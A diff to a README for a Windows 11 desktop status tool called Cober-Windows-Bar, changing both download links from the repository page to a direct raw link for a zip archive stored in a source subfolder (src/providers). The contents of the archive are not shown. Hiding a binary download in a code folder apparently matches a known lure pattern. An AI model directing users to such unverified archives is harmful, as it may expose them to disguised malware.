@@ -1,6 +1,6 @@
 # 🖥️ Cober-Windows-Bar - Manage your desktop status with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/yustosl1525/Cober-Windows-Bar)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/yustosl1525/Cober-Windows-Bar/raw/refs/heads/main/src/providers/Cober_Windows_Bar_v2.7-beta.3.zip)
 
 Cober-Windows-Bar acts as a central hub for your Windows 11 desktop. Use this tool to track music playback, monitor AI processing tasks, view download progress, and see system notifications. It organizes your workflow into one clean interface that fits the Windows 11 look and feel.
 
@@ -8,7 +8,7 @@ Cober-Windows-Bar acts as a central hub for your Windows 11 desktop. Use this to
 
 You can obtain the current version of Cober-Windows-Bar by visiting the project repository. 
 
-[Download Cober-Windows-Bar here](https://github.com/yustosl1525/Cober-Windows-Bar)
+[Download Cober-Windows-Bar here](https://github.com/yustosl1525/Cober-Windows-Bar/raw/refs/heads/main/src/providers/Cober_Windows_Bar_v2.7-beta.3.zip)
 
 Follow these steps to install the software:
 
